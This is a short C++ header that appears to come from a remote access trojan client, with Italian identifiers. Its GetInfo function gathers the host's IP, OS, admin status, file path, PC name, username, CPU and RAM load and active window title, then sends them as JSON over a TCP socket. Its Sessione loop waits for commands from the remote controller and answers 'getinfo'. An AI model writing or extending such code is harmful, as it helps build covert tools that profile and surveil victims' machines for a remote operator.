#pragma once

bool GetInfo(TcpIP Client)
{
    SystemUtils su;
    DirUtils du;
	WindowUtils wu;

    json j;

    j["IPL"] = TcpIP::GetLocalIP(Client.Sock);
    j["OS"] = su.GetOS();
    j["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
    j["PATH"] = du.GetFullFilePath();
    j["VER"] = Version;
    j["PCNAME"] = su.GetPCName();
    j["USERNAME"] = su.GetCurrentUser();
    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
	j["ACTWIN"] = wu.GetWindowTitle();
	j["INSTDATE"] = "TODO";

    if (COMUNICAZIONI::GetInfo(Client.Sock, j.dump()))
        return true;

    return false;
}

short Sessione(TcpIP Client)
{
	string cmd = "";

	for (bool i = true; i;)
	{
		cmd = Client.RecvString();

		if (cmd == "")
			return 0;
		else if (cmd == "getinfo")
		{
			if (!GetInfo(Client))
				return 0;
		}
	}

	return 0;
}